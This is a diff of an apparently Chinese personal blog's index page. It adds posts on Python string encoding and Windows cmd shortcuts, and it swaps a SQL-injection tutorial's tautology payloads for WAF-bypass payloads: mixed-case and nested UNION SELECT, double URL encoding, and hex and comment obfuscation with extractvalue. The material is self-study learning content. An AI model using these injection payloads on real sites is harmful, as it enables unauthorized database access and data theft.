@@ -170,6 +170,110 @@
           
           
             
+              <a class="post-title-link" href="/2015/08/20/python编码操作/" itemprop="url">
+                python编码操作
+              </a>
+            
+          
+        </h1>
+      
+
+      <div class="post-meta">
+        <span class="post-time">
+          发表于
+          <time itemprop="dateCreated" datetime="2015-08-20T09:33:07+08:00" content="2015-08-20">
+            2015-08-20
+          </time>
+        </span>
+
+        
+
+        
+          
+            <span class="post-comments-count">
+              &nbsp; | &nbsp;
+              <a href="/2015/08/20/python编码操作/#comments" itemprop="discussionUrl">
+                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/20/python编码操作/" itemprop="commentsCount"></span>
+              </a>
+            </span>
+          
+        
+      </div>
+    </header>
+
+    <div class="post-body">
+
+      
+      
+
+      
+        
+          <span itemprop="articleBody"><p>将所有字符串按字符串储存时的编码方式解码(decode)为unicode编码进行操作.</p>
+<h2 id="查看一个汉字的GBK,unicode,utf-8编码">查看一个汉字的GBK,unicode,utf-8编码</h2><ul>
+<li><p>GBK</p>
+<p>  //输入中文时默认的编码方式为gbk</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>s = “汉”<br>s<br>  ‘\xba\xba’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><p>unicode</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>s = s.decode(“gbk”)<br>s<br>  u’\u6c49’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+<li><p>utf-8</p>
+<blockquote>
+<blockquote>
+<blockquote>
+<p>s = s.encode(“utf-8”)<br>s<br>  ‘\xe6\xb1\x89’</p>
+</blockquote>
+</blockquote>
+</blockquote>
+</li>
+</ul>
+<h2 id="查看英文字母的ascii码">查看英文字母的ascii码</h2><p>注：ascii码是世界上最先使用的编码方式，在后来的一系列编码方式中，不管是gbk ucnicde 还是utf-8对于asii码都是向下兼容的，也就是说编码结果是一样的（在所占字节数上可能会有差异）.</p>
+<pre><code>&gt;&gt;&gt;<span class="string">"admin"</span>.<span class="function"><span class="title">encode</span><span class="params">(<span class="string">"hex"</span>)</span></span>
+<span class="string">'61646d696e'</span>
+&gt;&gt;&gt;<span class="string">'61646d696e'</span>.<span class="function"><span class="title">decode</span><span class="params">(<span class="string">"hex"</span>)</span></span>
+<span class="string">'admin'</span>
+</code></pre></span>
+        
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <header class="post-header">
+
+      
+      
+        <h1 class="post-title" itemprop="name headline">
+          
+          
+            
               <a class="post-title-link" href="/2015/08/19/cmd命令使用记录/" itemprop="url">
                 cmd命令使用记录
               </a>
@@ -211,6 +315,11 @@
           <span itemprop="articleBody"><h2 id="查看当前活动代码页（默认编码格式）">查看当前活动代码页（默认编码格式）</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">chcp</span>
 //活动代码页为：<span class="number">936</span>，它对于的编码格式为GBK
 </code></pre><h2 id="设置当前cmd窗口标题">设置当前cmd窗口标题</h2><pre><code><span class="built_in">cmd</span>&gt; <span class="built_in">title</span> Hello Mr.Q
+</code></pre><h2 id="添加删除程序">添加删除程序</h2><pre><code><span class="tag">cmd</span>&gt; <span class="tag">appwiz</span><span class="class">.cpl</span>
+</code></pre><h2 id="启动计算器">启动计算器</h2><pre><code><span class="built_ins">cmd</span>&gt; calc
+</code></pre><h2 id="事件查看器">事件查看器</h2><pre><code><span class="built_ins">cmd</span>&gt; eventvwr
+</code></pre><h2 id="查看系统配置">查看系统配置</h2><pre><code><span class="built_ins">cmd</span>&gt; msinfo32
+</code></pre><h2 id="注册表编辑器">注册表编辑器</h2><pre><code><span class="built_ins">cmd</span>&gt; regedit
 </code></pre></span>
         
       
@@ -497,7 +606,7 @@
           
             
               <a class="post-title-link" href="/2015/08/17/SQL注入练级攻略-7-绕过姿势-二/" itemprop="url">
-                SQL注入练级攻略-7-绕过姿势-(二)
+                SQL注入练级攻略-7-绕过姿势之waf-(二)
               </a>
             
           
@@ -534,22 +643,20 @@
 
       
         
-          <span itemprop="articleBody"><h2 id="Where后条件的各种转换姿势">Where后条件的各种转换姿势</h2><pre><code> <span class="string">' or "a"='</span>a<span class="string">'
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=n<span class="string">'a'</span>               <span class="comment">//unicode</span>
-<span class="string">' or '</span>a<span class="string">'=b'</span><span class="number">1100001</span><span class="string">'         //binary
-'</span> <span class="keyword">or</span> <span class="string">'a'</span>=x<span class="string">'61'</span>              <span class="comment">//16进制</span>
-<span class="string">' or 1=true #true=1, false=0
-'</span> <span class="keyword">or</span> <span class="number">1</span> #<span class="keyword">true</span>
-<span class="string">' or version()=5.5 #5.5.41-log
-'</span> <span class="keyword">or</span> round(pi(),<span class="number">1</span>)+<span class="keyword">true</span>+<span class="keyword">true</span>+<span class="number">0.4</span>=version() <span class="string">#3</span>.<span class="number">1</span>+<span class="number">1</span>+<span class="number">1</span>+<span class="number">0.4</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="string">'a'</span>=<span class="string">'b'</span>=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="string">'a'</span>=<span class="string">'b'</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="keyword">false</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="string">'c'</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> (<span class="number">0</span>)=<span class="number">0</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users <span class="keyword">where</span> <span class="keyword">true</span>
-<span class="keyword">select</span> * <span class="keyword">from</span> users
-</code></pre></span>
+          <span itemprop="articleBody"><h2 id="大小写绕过">大小写绕过</h2><p>最基本的的绕过，适用于过滤器对大小写敏感的场景</p>
+<pre><code>page.php?id=<span class="number">1</span> UniOn sElEcT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>;
+</code></pre><h2 id="替换关键字">替换关键字</h2><p>适用于过滤规则替换union select 等关键字的情况</p>
+<pre><code>page.php?id =<span class="number">1</span> UNIunionON SELselectECT <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span> ;
+</code></pre><p>也可以构造的更复杂视情况而定SeLSeselectleCTecT</p>
+<h2 id="使用编码">使用编码</h2><ul>
+<li><p>URL编码<br>普通的URL编码可能无法实现绕过不过存在某种情况URL编码只进行了一次解码过滤可以用两次编码绕过</p>
+<p>  page.php?id=1%252f%252a*/UNION%252f%252a/SELECT </p>
+</li>
+<li><p>Hex编码</p>
+<p>  z.com/index.php?page_id=-15 /<em>!u%6eion</em>/ /<em>!se%6cect</em>/ 1,2,3,4,SELECT(extractvalue(0x3C613E61646D696E3C2F613E,0x2f61))<br>  //6e-&gt;n   6c-&gt;l  字母的十六进制编码，与ascii码一致，在python解释器中<br>  //python&gt; “admin”.encode(“hex”) #61646D696E<br>  //python&gt; “61646D696E”.decode(“hex”) #admin</p>
+</li>
+</ul>
+</span>
         
       
     </div>
@@ -1254,111 +1361,6 @@ mysql&gt; select <span class="keyword">distinct</span> user <span class="keyword
 
 
     
-      
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <header class="post-header">
-
-      
-      
-        <h1 class="post-title" itemprop="name headline">
-          
-          
-            
-              <a class="post-title-link" href="/2015/08/12/SQL注入练级攻略-3-操作表/" itemprop="url">
-                SQL注入练级攻略(3)-table操作相关
-              </a>
-            
-          
-        </h1>
-      
-
-      <div class="post-meta">
-        <span class="post-time">
-          发表于
-          <time itemprop="dateCreated" datetime="2015-08-12T09:32:08+08:00" content="2015-08-12">
-            2015-08-12
-          </time>
-        </span>
-
-        
-          <span class="post-category" >
-            &nbsp; | &nbsp; 分类于
-            
-              <span itemprop="about" itemscope itemtype="https://schema.org/Thing">
-                <a href="/categories/SLQ注入练级系列/" itemprop="url" rel="index">
-                  <span itemprop="name">SLQ注入练级系列</span>
-                </a>
-              </span>
-
-              
-              
-
-            
-          </span>
-        
-
-        
-          
-            <span class="post-comments-count">
-              &nbsp; | &nbsp;
-              <a href="/2015/08/12/SQL注入练级攻略-3-操作表/#comments" itemprop="discussionUrl">
-                <span class="post-comments-count ds-thread-count" data-thread-key="2015/08/12/SQL注入练级攻略-3-操作表/" itemprop="commentsCount"></span>
-              </a>
-            </span>
-          
-        
-      </div>
-    </header>
-
-    <div class="post-body">
-
-      
-      
-
-      
-        
-          <span itemprop="articleBody"><p>记录表相关的增删改查操作包括：<strong>建库</strong>,<strong>表操作</strong>，<strong>记录的操作</strong></p>
-<h2 id="database"><h1>database</h1></h2><pre><code>mysql&gt; create database <span class="keyword">test</span>;
-mysql&gt; show databases;
-mysql&gt; <span class="keyword">drop</span> database <span class="keyword">test</span>;<span class="comment">//数据库的创建删除</span>
-</code></pre><h2 id="table"><h1>table</h1></h2><h2 id="建表">建表</h2><pre><code>mysql&gt; create table admin (
-mysql&gt; id           <span class="built_in">int</span>      <span class="literal">not</span> <span class="literal">null</span> primary key auto_increment,
-mysql&gt; username  varchar(<span class="number">30</span>) <span class="literal">not</span> <span class="literal">null</span>             <span class="keyword">default</span> <span class="string">'test'</span>,  
-mysql&gt; sex      <span class="keyword">enum</span>(<span class="string">'F'</span>,<span class="string">'M'</span>),
-mysql&gt; address   var char(<span class="number">50</span>)  <span class="literal">null</span>)<span class="comment">;</span>
-</code></pre><h2 id="查看">查看</h2><pre><code>mysql&gt; <span class="keyword">desc</span> admin;
-</code></pre><h2 id="修改">修改</h2><pre><code>mysql&gt; alter table admin <span class="built_in">add</span> tel1 <span class="keyword">char</span>(<span class="number">11</span>) <span class="operator">not</span> <span class="constant">null</span> ;<span class="comment"> //添加字段</span>
-mysql&gt; alter table admin <span class="built_in">add</span> tel2 <span class="keyword">after</span> sex ;<span class="comment"> //指定位置添加字段</span>
-mysql&gt; alter table admin drop tel2 <span class="comment">;//删除字段</span>
-mysql&gt; alter table admin change tel1 blog varchar(<span class="number">30</span>) <span class="constant">null</span> <span class="comment">;//将tel1改为blog后面至少要有修改后的字段类型.</span>
-mysql&gt; alter table admin change id id int <span class="keyword">after</span> username<span class="comment">;//调整字段位置</span>
-mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表</span>
-</code></pre><p>以后用到的语句再添加</p>
-<h2 id="删除">删除</h2><pre><code>mysql&gt; <span class="keyword">drop</span> <span class="keyword">table</span> admin;
-</code></pre><h2 id="record"><h1>record</h1></h2><pre><code><span class="operator">select <span class="keyword">id</span>,username <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> <span class="number">1</span>=<span class="number">1</span> ;</span>
-<span class="operator"><span class="keyword">insert</span> <span class="keyword">into</span> <span class="keyword">admin</span> (username,tel1) <span class="keyword">values</span>(<span class="string">"admin"</span>,<span class="string">"13000000000"</span>);</span>//除自增和带有默认值的字段外，NOT NULL的字段必须要进行赋值.
-<span class="operator"><span class="keyword">delete</span> <span class="keyword">from</span> <span class="keyword">admin</span> <span class="keyword">where</span> username = <span class="string">"admin"</span>;</span>//更新
-</code></pre><p><em>以上内容使用的数据库版本为mysql 5.6.17.</em></p>
-</span>
-        
-      
-    </div>
-
-    <footer class="post-footer">
-      
-
-      
-
-      
-      
-        <div class="post-eof"></div>
-      
-    </footer>
-  </article>
-
-
-    
   </section>
 
   
@@ -1397,7 +1399,7 @@ mysql&gt; alter table admin renanme admin5<span class="comment">;//重命名表<
         <nav class="site-state motion-element">
           <div class="site-state-item site-state-posts">
             <a href="/archives">
-              <span class="site-state-item-count">19</span>
+              <span class="site-state-item-count">20</span>
               <span class="site-state-item-name">日志</span>
             </a>
           </div>
